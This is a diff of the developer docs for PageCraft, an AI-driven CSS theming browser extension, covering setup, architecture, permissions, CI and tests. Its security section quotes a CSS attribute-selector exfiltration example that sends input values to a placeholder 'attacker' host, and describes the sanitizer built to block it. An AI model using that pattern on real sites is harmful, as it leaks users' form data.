@@ -76,6 +76,7 @@
   .todo .t { font-weight: 600; }
   .todo .d { color: var(--muted); font-size: 14px; }
   .todo li.is-done .t { color: var(--muted); text-decoration: line-through; text-decoration-color: var(--border); }
+  .todo li.is-declined .t { color: var(--muted); }
   .tag { font-size: 11px; font-weight: 600; color: var(--muted); border: 1px solid var(--border); border-radius: 4px; padding: 0 5px; margin-left: 6px; white-space: nowrap; }
 
   @media (max-width: 820px) {
@@ -90,7 +91,7 @@
 <div class="layout">
   <nav aria-label="Sections">
     <strong>PageCraft</strong>
-    <span class="ver">v1.1.0 · developer docs</span>
+    <span class="ver">v1.4.0 · developer docs</span>
     <a href="#overview">Overview</a>
     <a href="#setup">Setup &amp; build</a>
     <a href="#usage">Using it</a>
@@ -99,6 +100,9 @@
     <a href="#generation">Generation pipeline</a>
     <a href="#data">Data model</a>
     <a href="#security">Security &amp; privacy</a>
+    <a href="#permissions">Permissions</a>
+    <a href="#release">CI &amp; release</a>
+    <a href="#i18n">Localisation</a>
     <a href="#testing">Testing</a>
     <a href="#roadmap">Roadmap &amp; to-do</a>
   </nav>
@@ -117,7 +121,8 @@ npm run dev:firefox    # Firefox MV3 with hot reload
 npm run build          # → .output/chrome-mv3/
 npm run build:firefox  # → .output/firefox-mv3/
 npm run zip            # store-ready zip (add :firefox for AMO; also creates a sources zip)
-npm run compile        # type-check only</code></pre>
+npm run compile        # type-check only
+npm test               # unit tests (Vitest); npm run test:watch to keep it running</code></pre>
     <h3>Load a build manually</h3>
     <ul>
       <li><strong>Chrome / Edge / Brave:</strong> <code>chrome://extensions</code> → Developer mode → <em>Load unpacked</em> → choose <code>.output/chrome-mv3</code>.</li>
@@ -127,13 +132,49 @@ npm run compile        # type-check only</code></pre>
 
     <h2 id="usage">Using it</h2>
     <ol>
-      <li>Open <strong>AI settings</strong> from the popup. Pick a provider, add a key if it needs one, choose a model with <em>Load models</em>, press <em>Test connection</em>, then <em>Save</em>.</li>
-      <li>On any website, open the popup → <strong>CustomStyle editor</strong>. The editor opens in a new tab linked to the site's tab.</li>
-      <li>Describe the theme (e.g. “warm dark theme, amber accents, larger body text”) and press <strong>Generate</strong> or <kbd>Ctrl+Enter</kbd>. CSS streams into the editor, and <strong>Live preview</strong> shows it on the site tab.</li>
-      <li>Refine: with <strong>Refine current</strong> checked, the current CSS goes along with your next instruction so the model edits it instead of starting over.</li>
-      <li><strong>Save</strong> (<kbd>Ctrl+S</kbd>) stores the style and applies it to that hostname. The popup's <em>MyStyles</em> list lets you switch styles per site.</li>
+      <li>Open <strong>Settings &amp; themes</strong> from the popup. Pick a provider, add a key if it needs one, choose a model with <em>Load models</em>, press <em>Test connection</em>, then <em>Save</em>.</li>
+      <li>On a website, open the popup and press <strong>Enable on this site</strong> (or <em>Enable on all sites</em>). PageCraft has no website access until you do this.</li>
+      <li>Open <strong>CustomStyle editor</strong>. The editor opens in a new tab linked to the site's tab. The estimate next to the provider shows roughly how many tokens the next request will use.</li>
+      <li>Describe the theme (e.g. “warm dark theme, amber accents, larger body text”) and press <strong>Generate</strong> or <kbd>Ctrl+Enter</kbd>. The model designs a palette first, then streams the CSS into the editor. <strong>Live preview</strong> shows it on the site tab.</li>
+      <li>Refine: with <strong>Refine current</strong> checked, the current palette, CSS and recent conversation go along with your next instruction (“make the header darker”), so the model edits the theme instead of starting over. Earlier turns appear under <em>Conversation</em>.</li>
+      <li><strong>Review</strong>: the AI looks at the previewed theme and fixes problems. It gets a contrast report, plus a screenshot if <em>Send screenshot</em> is on. Text in the prompt box is added as an extra instruction.</li>
+      <li>Tweak without AI: open <strong>Palette</strong> to change colors, fonts, size, radius and border width. Only the token block at the top of the CSS is rewritten.</li>
+      <li><strong>Save</strong> (<kbd>Ctrl+S</kbd>) stores the style and applies it to that hostname. The popup's style list switches styles per site. <em>Settings → Themes &amp; sites</em> applies a style to more sites with patterns, or to every site.</li>
     </ol>
-    <p>Closing the editor drops the unsaved preview. The site goes back to its saved style.</p>
+    <p>Closing the editor drops the unsaved preview. The site goes back to its saved style. The preview also shows inside same-site iframes (when iframes are enabled).</p>
+    <h3>Undo and history</h3>
+    <ul>
+      <li><strong>Undo</strong> (next to Generate) steps back through the CSS from before each generation, loaded version, “New” or delete in this editor session (up to 30 steps).</li>
+      <li><strong>History</strong> (toolbar) lists the last 20 <em>saved</em> versions of the style. Picking one loads it into the editor and the preview. Press Save to keep it, or Undo to go back.</li>
+    </ul>
+    <h3>Contrast checker</h3>
+    <p>After each preview change, the site tab measures text contrast (WCAG AA: 4.5:1, or 3:1 for large text). The chip next to the status shows the result, and clicking it lists failing elements with their colors and ratios. Text over background images or gradients is skipped because it can't be measured reliably. Each scan stops after 150 ms. On heavy pages it reports a partial result, and the next scan waits longer (4 s instead of 1.5 s). The Palette panel also rates the contrast of the important token pairs (text on background, text on accent, …) as you edit.</p>
+    <h3>Screenshot</h3>
+    <p><em>Send screenshot</em> (remembered per browser) attaches a downscaled JPEG of the visible part of the site tab. It only works with vision-capable models. Firefox captures the tab directly. Chrome can only capture the active tab, so the site tab comes to the front for about half a second. Chrome also needs either all-sites access or a recent popup click on that tab (<code>activeTab</code>) to capture it.</p>
+    <h3>Editor</h3>
+    <p>CodeMirror 6 with CSS completion, search (<kbd>Ctrl+F</kbd>), real undo (<kbd>Ctrl+Z</kbd>, which also undoes a whole generation in one step), bracket matching, folding, a color swatch before each color value (click to pick), and css-tree syntax warnings.</p>
+    <h3>Site rules and global themes</h3>
+    <p>Each style can apply to any number of patterns:</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Pattern</th><th>Matches</th></tr></thead>
+      <tbody>
+        <tr><td><code>example.com</code></td><td>That host only</td></tr>
+        <tr><td><code>*.example.com</code></td><td>The host and all subdomains</td></tr>
+        <tr><td><code>example.com/docs/*</code></td><td>That host, paths starting with <code>/docs/</code></td></tr>
+        <tr><td><code>*</code></td><td>Every site (a global theme)</td></tr>
+      </tbody>
+    </table></div>
+    <p>The most specific match wins: a path rule beats an exact host, which beats a wildcard host, which beats <code>*</code>. Rules can be paused without deleting them. Single-page apps are re-checked when the path changes, so path rules follow in-app navigation. The popup shows when a broader rule is what applies on the current site.</p>
+    <h3>Per-site overrides</h3>
+    <p><em>Pause PageCraft on this site</em> in the popup turns everything off for one host, presets included. In <em>Settings → Site access → Per-site overrides</em> you can also force iframes and web-component theming on or off for a single host.</p>
+    <h3>Import and export</h3>
+    <p><em>Settings → Themes &amp; sites</em> exports all styles (or one) with their rules as JSON. Exports never include API keys, version history or conversations. Imports are validated, CSS goes through the sanitizer, and rules are merged: an imported rule replaces an existing rule for the same pattern.</p>
+    <h3>API key protection</h3>
+    <p>Optional. With a passphrase set, keys are encrypted at rest and you unlock them once per browser session (in settings, or in the dialog the editor shows when you press Generate). There's no recovery: if you forget the passphrase, enter your keys again.</p>
+    <h3>Tokens and cost</h3>
+    <p>The editor shows an approximate size of the next request (text ≈ 3.6 characters per token, images per the provider's documented rules) plus a typical output of about 4k tokens. After each generation it shows the token counts the provider reported. A cost appears only if you enter your own prices per million tokens in settings. PageCraft doesn't ship prices because they change. <em>Page detail sent to the AI</em> (small / normal / large) controls the digest size.</p>
+    <h3>Site access</h3>
+    <p>See <a href="#permissions">Permissions</a>. Provider hosts are requested the first time you Load models, Test, Save or Generate. Tabs that were open before PageCraft was installed get the content script injected when you open the popup or editor.</p>
 
     <h2 id="providers">AI providers</h2>
     <div class="table-wrap"><table>
@@ -159,15 +200,31 @@ launchctl setenv OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
       <thead><tr><th>Path</th><th>Role</th></tr></thead>
       <tbody>
         <tr><td><code>wxt.config.ts</code></td><td>Manifest source: permissions, icons, Firefox <code>gecko</code> id (added to Firefox builds only).</td></tr>
-        <tr><td><code>entrypoints/content.ts</code></td><td>Runs on every page at <code>document_start</code>. Applies preset + legacy CSS + selected style (or live preview) in one <code>&lt;style&gt;</code>. Answers digest requests and accepts the preview port.</td></tr>
-        <tr><td><code>entrypoints/popup/</code></td><td>Toolbar popup: on/off, global preset, per-site style, open editor/settings.</td></tr>
-        <tr><td><code>entrypoints/editor/</code></td><td><code>editor.html</code>. <code>main.ts</code> handles style CRUD, generation and preview. <code>code-editor.ts</code> is the textarea editor behind a small API, so CodeMirror can replace it.</td></tr>
-        <tr><td><code>entrypoints/options/</code></td><td>AI settings page: provider, key, base URL, model list, connection test.</td></tr>
+        <tr><td><code>entrypoints/content.ts</code></td><td>Runs in every frame at <code>document_start</code>. Combines preset + legacy CSS + selected style (or live preview) and hands it to the injector. In the top frame it also answers digest, contrast and ping requests and accepts the preview port.</td></tr>
+        <tr><td><code>entrypoints/background.ts</code></td><td>Keeps the content script registered (<code>scripting.registerContentScripts</code>) for exactly the origins the user granted.</td></tr>
+        <tr><td><code>entrypoints/popup/</code></td><td>Toolbar popup: on/off, enable site / all sites, global preset, per-site style, pause on this site, open editor/settings.</td></tr>
+        <tr><td><code>entrypoints/editor/</code></td><td><code>editor.html</code>. <code>main.ts</code> handles style CRUD, generation, review, conversation, contrast and preview. <code>code-editor.ts</code> is CodeMirror 6 behind a small API. <code>palette.ts</code> is the token editor.</td></tr>
+        <tr><td><code>entrypoints/options/</code></td><td>Settings page, split into <code>ai-section.ts</code> (provider, prices, digest size), <code>vault-section.ts</code> (key protection), <code>themes-section.ts</code> (rules, import/export) and <code>access-section.ts</code> (granted sites, injection, per-site overrides).</td></tr>
         <tr><td><code>lib/storage.ts</code></td><td>Typed access to <code>storage.local</code> (themes and AI settings) with defaults.</td></tr>
-        <tr><td><code>lib/ai/providers.ts</code></td><td>Provider layer: one <code>streamText()</code> API over three wire formats, SSE parser, <code>listModels()</code>, helpful error hints.</td></tr>
-        <tr><td><code>lib/ai/prompt.ts</code></td><td>System prompt (theming rules) and user message builder.</td></tr>
+        <tr><td><code>lib/ai/providers.ts</code></td><td>Provider layer: one <code>streamText()</code> API over three wire formats (text and image parts), SSE parser, <code>listModels()</code>, helpful error hints.</td></tr>
+        <tr><td><code>lib/ai/prompt.ts</code></td><td>System prompt (tokens → CSS format, design rules), review instruction, message builder (conversation, screenshot, contrast) and response parser.</td></tr>
         <tr><td><code>lib/ai/sanitize.ts</code></td><td>Extracts CSS from model output and strips external references (see <a href="#security">security</a>).</td></tr>
+        <tr><td><code>lib/ai/fences.ts</code></td><td>Splits model output into fenced blocks and the summary text around them (works while streaming).</td></tr>
+        <tr><td><code>lib/tokens.ts</code></td><td>Design tokens: strict validation, the <code>:root { --pc-* }</code> block, reading tokens back from CSS.</td></tr>
+        <tr><td><code>lib/contrast.ts</code>, <code>lib/contrast-scan.ts</code></td><td>WCAG math (pure), and the in-page scan that composites backgrounds and groups failures.</td></tr>
+        <tr><td><code>lib/injector.ts</code></td><td>Owns the page's <code>&lt;style&gt;</code>: keeps it last in <code>&lt;head&gt;</code>, re-adds it if removed, and mirrors it into open shadow roots.</td></tr>
+        <tr><td><code>lib/screenshot.ts</code></td><td>Tab capture (Firefox <code>captureTab</code>, Chrome activate + <code>captureVisibleTab</code>) and downscaling.</td></tr>
+        <tr><td><code>lib/history.ts</code></td><td>Saved-version history (newest first, capped at 20, no duplicates).</td></tr>
+        <tr><td><code>lib/permissions.ts</code></td><td>Site and provider host permission checks and requests (must run inside a user gesture).</td></tr>
+        <tr><td><code>lib/tabs.ts</code></td><td><code>ensureContentScript()</code>: ping the tab and inject the content script if nothing answers.</td></tr>
+        <tr><td><code>tests/</code>, <code>scripts/vitest.mjs</code></td><td>Vitest unit tests and a launcher that fixes Windows drive-letter casing.</td></tr>
         <tr><td><code>lib/digest.ts</code></td><td>Builds the compact page description sent to the model.</td></tr>
+        <tr><td><code>lib/rules.ts</code></td><td>Site pattern parsing, matching and specificity, plus migration from the 1.x hostname map.</td></tr>
+        <tr><td><code>lib/backup.ts</code></td><td>Export format, validation and sanitizing of imports, merge rules.</td></tr>
+        <tr><td><code>lib/vault.ts</code></td><td>PBKDF2 + AES-GCM key vault. The unlocked key lives in <code>storage.session</code>.</td></tr>
+        <tr><td><code>lib/ai/estimate.ts</code></td><td>Token estimates (text, images per provider) and optional cost.</td></tr>
+        <tr><td><code>lib/i18n.ts</code>, <code>public/_locales/</code></td><td><code>t()</code> and <code>localizePage()</code> over <code>browser.i18n</code>. Keys are type-checked against the English catalog.</td></tr>
+        <tr><td><code>.github/workflows/</code></td><td><code>ci.yml</code> (check, test, zip) and <code>release.yml</code> (manual store submission).</td></tr>
         <tr><td><code>lib/messages.ts</code></td><td>Message and port contracts between pages and the content script.</td></tr>
       </tbody>
     </table></div>
@@ -175,40 +232,108 @@ launchctl setenv OLLAMA_ORIGINS "chrome-extension://*,moz-extension://*"
     <h2 id="generation">Generation pipeline</h2>
     <div class="flow">
       <div><b>Digest</b><span>Content script describes the page with PageCraft's own sheet off.</span></div>
-      <div><b>Prompt</b><span>System rules + digest + current CSS (when refining) + instructions.</span></div>
-      <div><b>Stream</b><span>Provider streams text. The editor shows the extracted CSS live.</span></div>
-      <div><b>Sanitize</b><span>Strip <code>@import</code> and external <code>url()</code>, then re-parse in the browser.</span></div>
+      <div><b>Prompt</b><span>Rules + digest + current tokens/CSS + recent turns + screenshot/contrast (optional) + instructions.</span></div>
+      <div><b>Stream</b><span>JSON tokens first, then CSS using <code>var(--pc-*)</code>, then a one-line summary.</span></div>
+      <div><b>Sanitize</b><span>Tokens validated and written by PageCraft. CSS sanitized (css-tree) and any <code>--pc-*</code> declarations removed.</span></div>
       <div><b>Preview → Save</b><span>Applied to the tab over a port. Saved only on explicit Save.</span></div>
     </div>
     <h3>Page digest contents</h3>
     <p>URL (origin + path, no query string), title, language, declared <code>color-scheme</code>, up to 80 <code>:root</code> CSS custom properties, the main background and text colors, fonts, and a DOM outline (max 220 lines, depth 9). The outline lists <code>tag#id.class [role aria-label data-*]</code>, collapses repeated siblings (<code>li ×24</code>) and leaves out hashed class names. No text content or form values are included.</p>
+    <h3>Design tokens</h3>
+    <p>The model answers with a <code>```json</code> block of tokens: name, scheme, 12 colors (background, surface, surfaceRaised, text, textMuted, border, accent, onAccent, link, selection, codeBackground, danger), fonts, base size, line height, radius and border width. After that comes a <code>```css</code> block that uses only <code>var(--pc-…)</code>. PageCraft validates each token against a strict grammar (invalid values fall back to the scheme's defaults) and writes this block at the top of the stylesheet:</p>
+<pre><code>/* pagecraft:tokens:start · Ember · edit in the Palette panel */
+:root {
+  color-scheme: dark !important;
+  --pc-background: #16181c;
+  …
+}
+/* pagecraft:tokens:end */</code></pre>
+    <p>The block is the single source of truth: the Palette panel reads it back and rewrites only it. The model's own CSS can't redefine <code>--pc-*</code>. The model sees tokens as JSON and the rest of the CSS separately. Generating tokens and CSS in one response (tokens first) gives the model a plan to follow without the cost and delay of two requests. Models that skip the JSON still work, but their result has no palette.</p>
     <h3>Prompt rules (summary)</h3>
-    <p>Output one <code>```css</code> block. Override site CSS variables first. Use stable selectors (roles, attributes, semantic classes). Keep WCAG AA contrast. Don't hide content. Style hover/focus states, forms, code and tables. No remote resources. When refining, return the full updated stylesheet.</p>
+    <p>Pick an accessible palette first. Override site CSS variables with <code>var(--pc-*)</code>, then cover what they miss. Use stable selectors (roles, attributes, semantic classes). Don't hide content or change layout. Style hover/focus states, forms, code, tables, selection and scrollbars. Keep fonts <code>inherit</code> unless asked. No remote resources. When refining, return the full updated tokens and CSS.</p>
+    <h3>Conversation</h3>
+    <p>Each generation adds a turn: your instruction plus the model's one-line summary. Up to 20 turns are saved with the style, and the last 6 are replayed as alternating user/assistant messages when refining. Summaries are sent instead of full CSS to save tokens. Turning off <em>Refine current</em> starts a new conversation.</p>
+    <h3>How themes are injected</h3>
+    <ul>
+      <li>One <code>&lt;style&gt;</code> element, kept last in <code>&lt;head&gt;</code>. A MutationObserver puts it back if a single-page app's head manager removes or reorders it.</li>
+      <li>Not <code>@layer</code>: unlayered site CSS beats any layer for normal declarations, so a layer would make themes <em>weaker</em>. Not <code>adoptedStyleSheets</code>: sheets constructed in a content script are unreliable across browsers (Firefox Xray wrappers).</li>
+      <li>Iframes (on by default): the content script runs in all frames, and each frame applies the style chosen for its own hostname. Presets apply everywhere. Editor messages target only the top frame.</li>
+      <li>Open shadow roots (opt-in): the CSS is copied into each open shadow root, and new ones are picked up after DOM changes. This themes web components, but page-level rules can change how components look, hence opt-in. Inherited properties and <code>--pc-*</code> variables reach into shadow DOM even with this off.</li>
+    </ul>
 
     <h2 id="data">Data model</h2>
     <p>Everything lives in <code>browser.storage.local</code> (never <code>sync</code>):</p>
 <pre><code>enabled: boolean                    // global on/off
 preset: "none" | "dark" | "light"
 styles: { [hostname]: css }         // legacy 1.0 per-host CSS, still applied
-myStyles: [{ id, name, css, prompt?, updatedAt? }]
-selectedMyStyles: { [hostname]: styleId }
+myStyles: [{ id, name, css, prompt?, updatedAt?,
+             history?: [{ css, prompt?, savedAt }],          // newest first, max 20
+             conversation?: [{ instruction, summary, at }] }] // oldest first, max 20
+injection: { frames: boolean, shadowRoots: boolean }         // default true / false
+siteRules: [{ id, styleId, pattern, enabled }]                 // which style applies where
+siteSettings: { [hostname]: { paused?, frames?, shadowRoots? } } // per-site overrides
+selectedMyStyles: { [hostname]: styleId }                      // 1.x only: read once to build siteRules
 ai: {
   activeProvider: "anthropic" | "openai" | "gemini" | "local",
-  providers: { [id]: { apiKey, baseUrl, model } }
-}</code></pre>
-    <p>The content script refreshes only when a theme key changes. Saving AI settings doesn't re-render pages.</p>
+  providers: { [id]: { apiKey, baseUrl, model, inputPrice?, outputPrice? } },
+  digestSize: "small" | "normal" | "large",
+  vault: null | { version, iterations, salt, iv, data }      // apiKey fields are "" when set
+}
+// storage.session (memory only): pagecraft.vaultKey, the unlocked AES key</code></pre>
+    <p>Design tokens are not stored separately. They live in the style's CSS token block. The <em>Send screenshot</em> choice is a per-browser convenience in the editor page's <code>localStorage</code>. The content script refreshes only when a theme key changes. Saving AI settings doesn't re-render pages.</p>
 
     <h2 id="security">Security &amp; privacy</h2>
     <ul>
-      <li><strong>CSS data leaks.</strong> CSS can send page data out, e.g. <code>input[value^="a"] { background: url(https://attacker/a) }</code>. Generated CSS therefore has <code>@import</code>, every non-<code>data:</code> <code>url()</code>, external <code>image-set()</code> strings, <code>-moz-binding</code>/<code>behavior</code> and <code>expression()</code> removed. It is then re-parsed with <code>CSSStyleSheet.replaceSync</code>. If anything external is left after that (e.g. hidden with CSS escapes), the normalized output is used and stripped again. A warning lists the fixes.</li>
+      <li><strong>CSS data leaks.</strong> CSS can send page data out, e.g. <code>input[value^="a"] { background: url(https://attacker/a) }</code>. Generated CSS is parsed with <a href="https://github.com/csstree/csstree">css-tree</a>. The sanitizer removes <code>@import</code> (escaped spellings included), any declaration that uses a non-<code>data:</code> <code>url()</code>, any external string inside <code>image-set()</code>/<code>image()</code>/<code>src()</code>/<code>cross-fade()</code>, <code>-moz-binding</code>/<code>behavior</code>, <code>expression()</code>, and unparseable text that looks like a reference (e.g. <code>u\72l(…)</code>). It cuts those exact source ranges out, so comments and formatting survive, and repeats until clean. In the browser, a final re-parse with <code>CSSStyleSheet</code> rejects the whole stylesheet if anything external remains. A warning lists the fixes.</li>
+      <li><strong>Token values</strong> are checked against strict grammars (colors, font stacks, lengths). Anything that could end a declaration, open a block, add a comment or reference a resource is replaced with a default. The theme name can't contain <code>*/</code>.</li>
       <li>CSS you type by hand is <em>not</em> sanitized. It's yours.</li>
-      <li><strong>API keys</strong> are stored unencrypted in extension-local storage and sent only to the configured base URL. Web pages can't read extension storage.</li>
-      <li><strong>Data sent</strong> on Generate: instructions, current CSS (if refining), page digest. The settings page says this too. This replaces the 1.0 “no network requests” claim.</li>
-      <li>Permissions: <code>storage</code>, <code>activeTab</code>, <code>&lt;all_urls&gt;</code> host access (applying themes + calling provider APIs, localhost included). Narrowing these is on the roadmap.</li>
+      <li><strong>Firefox data collection:</strong> the manifest declares <code>data_collection_permissions.required = ["websiteContent", "browsingActivity"]</code>, because the page URL and a structural digest go to the user's AI provider on Generate. Check this against current AMO policy before submitting.</li>
+      <li><strong>API keys</strong> are sent only to the configured base URL. Web pages can't read extension storage. Without key protection they're stored unencrypted in extension-local storage. With it, they're encrypted using AES-GCM-256 with a key derived by PBKDF2-SHA-256 (600,000 iterations, random salt, new IV per write). The unlocked key is held in <code>storage.session</code>, which is memory only, readable only by extension pages, and cleared when the browser closes. This protects keys on disk, not in an unlocked session.</li>
+      <li><strong>Imported themes</strong> are untrusted: the CSS is sanitized like AI output, sizes are capped, and invalid rules are dropped.</li>
+      <li><strong>Data sent</strong> on Generate/Review: instructions, the last 6 conversation turns, current tokens and CSS (if refining), the page digest, and on Review a contrast report (element descriptions and colors, no text). With <em>Send screenshot</em> on, also a screenshot of the visible page, which <em>can</em> show page text and personal data. That's why it's opt-in. The settings page lists all of this.</li>
+      <li>Permissions: see below. No website is accessible until the user enables it.</li>
     </ul>
 
+    <h2 id="permissions">Permissions</h2>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Permission</th><th>When</th><th>Why</th></tr></thead>
+      <tbody>
+        <tr><td><code>storage</code></td><td>Install</td><td>Styles, rules and settings.</td></tr>
+        <tr><td><code>activeTab</code></td><td>Install (no warning)</td><td>Temporary access to the tab you open the popup on: inject the content script, preview, screenshot.</td></tr>
+        <tr><td><code>scripting</code></td><td>Install</td><td>Register the content script for granted sites, and inject it into open tabs.</td></tr>
+        <tr><td><code>optional_host_permissions: &lt;all_urls&gt;</code></td><td>On request</td><td>Per site (“Enable on this site”), all sites (“Enable on all sites”), and each AI provider's API host on first use. Granted sites are listed and revocable in settings.</td></tr>
+      </tbody>
+    </table></div>
+    <p>The content script uses WXT's <code>registration: "runtime"</code>. The background script registers it for the granted origins and updates the registration when permissions change. WXT adds the content script's matches to <code>host_permissions</code> by default, and a <code>build:manifestGenerated</code> hook in <code>wxt.config.ts</code> removes them again. Firefox requires 128+ for <code>optional_host_permissions</code>.</p>
+    <div class="callout"><strong>Upgrading from 1.3 or earlier:</strong> those versions had all-sites access at install. After updating, browsers may drop that grant because it's now optional. Users then see “Enable on this site” in the popup and need to enable sites (or all sites) once. Check this during the smoke test and mention it in the store release notes.</div>
+
+    <h2 id="release">CI &amp; release</h2>
+    <ul>
+      <li><strong><code>ci.yml</code></strong> runs on pushes to <code>main</code>/<code>dev</code> and on pull requests. Steps: <code>npm ci</code>, type-check, unit tests, then Chrome and Firefox zips uploaded as build artifacts (kept 14 days).</li>
+      <li><strong><code>release.yml</code></strong> is manual (<em>Actions → Release → Run workflow</em>). It builds, tests and runs <code>wxt submit</code>. It defaults to a <strong>dry run</strong> that only checks credentials. Choose Chrome, Firefox or both. A real run also creates a GitHub release <code>v&lt;version&gt;</code> with the zips attached.</li>
+      <li>Secrets live in a GitHub environment named <code>store</code> (add required reviewers there to approve each submission): <code>CHROME_EXTENSION_ID</code>, <code>CHROME_PUBLISHER_ID</code>, <code>CHROME_SERVICE_ACCOUNT_CLIENT_EMAIL</code>, <code>CHROME_SERVICE_ACCOUNT_PRIVATE_KEY</code> (Chrome Web Store API v2 service account), <code>FIREFOX_JWT_ISSUER</code>, <code>FIREFOX_JWT_SECRET</code> (AMO API key). <code>npx wxt submit init</code> walks through getting them.</li>
+      <li>Before a release: bump <code>version</code> in <code>package.json</code>, update <code>CHANGELOG.md</code>, run the manual smoke test. The AMO sources zip leaves out <code>design/</code> and <code>.github/</code>.</li>
+    </ul>
+
+    <h2 id="i18n">Localisation</h2>
+    <p>Strings live in <code>public/_locales/&lt;lang&gt;/messages.json</code>. The manifest uses <code>__MSG_extName__</code>, <code>__MSG_extDescription__</code> and <code>__MSG_extActionTitle__</code>. In pages, <code>data-i18n</code> (text), <code>data-i18n-title</code>, <code>data-i18n-placeholder</code> and <code>data-i18n-aria-label</code> are filled by <code>localizePage()</code>. In code, <code>t("key", …args)</code> replaces <code>{0}</code>, <code>{1}</code> and so on. Messages must not contain <code>$</code>, because the browser treats it as a placeholder marker. A unit test checks that every key used exists and that none contains <code>$</code>.</p>
+    <p><strong>Covered:</strong> manifest, all page markup (popup, settings, editor) and all popup and settings messages. <strong>Not yet:</strong> the editor's dynamic status messages and the palette labels, which are still English in code. Only English ships. To add a language, copy <code>en/messages.json</code> to e.g. <code>de/messages.json</code> and translate the <code>message</code> values.</p>
+
     <h2 id="testing">Testing</h2>
-    <p>Automated: <code>npm run compile</code> (strict TypeScript) and both browser builds pass. Unit tests aren't set up yet. Manual smoke test, per browser:</p>
+    <p><strong>Automated:</strong> <code>npm test</code> runs 95 Vitest tests (also in CI):</p>
+    <ul>
+      <li><code>sanitize.test.ts</code>: fences, escapes, @import, url() variants, image-set/src, custom properties, nested rules, junk.</li>
+      <li><code>providers.test.ts</code>: SSE parsing per provider with chunks split mid-line, headers, error hints, model listing, image parts per provider.</li>
+      <li><code>prompt.test.ts</code>: fence parsing, token/CSS/summary parsing while streaming, conversation replay, screenshot and contrast in messages.</li>
+      <li><code>tokens-contrast.test.ts</code>: token validation (including injection attempts), token block round-trip, WCAG math.</li>
+      <li><code>injector.test.ts</code> and <code>digest.test.ts</code> (happy-dom): re-adding/reordering the style element, shadow-root mirroring, digest privacy.</li>
+      <li><code>rules-backup.test.ts</code>: pattern validation, matching and specificity, host rules, 1.x migration, export privacy, import sanitizing, merge behaviour.</li>
+      <li><code>vault-storage.test.ts</code>: encrypt/unlock/wrong passphrase/lock/re-encrypt, keys present only while unlocked, storage migration and defaults.</li>
+      <li><code>estimate-i18n.test.ts</code>: token and cost estimates, catalog coverage, no <code>$</code>, substitution.</li>
+      <li><code>providers.test.ts</code> also covers usage reporting per provider. Plus <code>history.test.ts</code> and <code>permissions.test.ts</code>.</li>
+    </ul>
+    <p>Run tests through <code>npm test</code>, not <code>npx vitest</code>. On Windows a lowercase drive letter (<code>e:\</code>) makes Vitest load twice, and the launcher script fixes that. <code>npm run compile</code> and both builds must pass too.</p>
+    <p><strong>Manual smoke test</strong>, per browser:</p>
     <ol>
       <li>Global preset applies to HTTP(S) pages. Toggling PageCraft off removes all PageCraft CSS.</li>
       <li>Hand-written style saves, applies to its hostname and survives reload. Data from 1.0 still applies.</li>
@@ -217,6 +342,27 @@ ai: {
       <li>Refine: a second instruction changes only what you asked for.</li>
       <li>Close the editor without saving: the tab goes back to the saved style.</li>
       <li>Ollama without <code>OLLAMA_ORIGINS</code> shows the 403 hint.</li>
+      <li>Undo after a generation restores the old CSS. History lists earlier saves and loads them.</li>
+      <li>A tab opened <em>before</em> installing PageCraft: popup and editor work without reloading it.</li>
+      <li>Firefox: remove “Access your data for all websites” in about:addons → the popup banner appears and its button restores access.</li>
+      <li>Generate: a palette is designed first. The Palette panel shows it, and editing a color updates the preview right away without an AI call.</li>
+      <li>Refine twice: Conversation shows both turns, and the second change keeps the first.</li>
+      <li>Contrast chip appears after preview, lists failing elements, and Review fixes them.</li>
+      <li>Send screenshot with a vision model (Chrome: the site tab flashes forward briefly). With a text-only model the error suggests turning it off.</li>
+      <li>Ctrl+Z after a generation restores the previous CSS in one step. Color swatches open a picker.</li>
+      <li>A site with iframes (e.g. an embedded widget) gets the preset inside frames. Turning “Inside iframes” off removes it there.</li>
+      <li>A single-page app that rewrites <code>&lt;head&gt;</code> on navigation (e.g. YouTube, GitHub) keeps the theme after in-app navigation.</li>
+      <li>A site using web components with “Inside web components” on: themed inside components, and off again cleanly.</li>
+      <li>Fresh install: no site access warning at install. The popup shows “Enable on this site”. After enabling, the theme applies on reload and in new tabs of that site, and other sites stay untouched.</li>
+      <li>“Enable on all sites”, then settings → “Only sites listed above” removes the global grant again. Revoking a site in settings stops theming there.</li>
+      <li>Upgrade from 1.3: check whether the old all-sites grant survives (see <a href="#permissions">Permissions</a>).</li>
+      <li>Rules: add <code>*.wikipedia.org</code> and <code>*</code> to two styles. Subdomains get the first, other sites the second, and the popup explains which rule applies. Pause a rule and it stops applying.</li>
+      <li>Pause on this site: everything disappears there, presets included. Override “Iframes: Off” for one site.</li>
+      <li>Export all, delete a style, import: it comes back with its rules. Importing a file with an external <code>url()</code> shows a warning and strips it.</li>
+      <li>Key protection: set a passphrase, restart the browser, press Generate. The unlock dialog appears, a wrong passphrase is rejected, and the right one works. Remove protection restores plain keys.</li>
+      <li>Estimate changes as you type and with Screenshot on. After generating, the status shows the reported token usage, and a cost once prices are entered.</li>
+      <li>Palette contrast list updates while editing colors. Live preview shows inside a same-site iframe.</li>
+      <li>Switch the browser language (or add a test locale): popup and settings text comes from <code>_locales</code>.</li>
     </ol>
 
     <h2 id="roadmap">Roadmap &amp; to-do</h2>
@@ -234,42 +380,54 @@ ai: {
     </section>
 
     <section class="phase">
-      <h3>Phase 2: Harden what exists <span class="pill next">next</span></h3>
+      <h3>Phase 2: Harden what exists <span class="pill next">almost done</span></h3>
       <ul class="todo">
-        <li><input type="checkbox" disabled><div><div class="t">Manual smoke test in Chrome and Firefox with every provider <span class="tag">blocker</span></div><div class="d">Builds pass, but no real browser test has run yet. Follow the <a href="#testing">checklist</a>.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Undo / version history for generations <span class="tag">high</span></div><div class="d">Replacing the textarea value clears native undo. Keep the last N versions per style plus a “Revert” button.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Inject into tabs that were open before install <span class="tag">high</span></div><div class="d">Those tabs have no content script, so digest and preview fail until reload. Add the <code>scripting</code> permission and inject on demand.</div></div></li>
-        <li><input type="checkbox" disabled><div><div class="t">Firefox host-permission check <span class="tag">high</span></div><div class="d">Firefox lets users withhold <code>&lt;all_urls&gt;</code>. Check with <code>permissions.contains</code> and ask from the popup.</div></div></li>
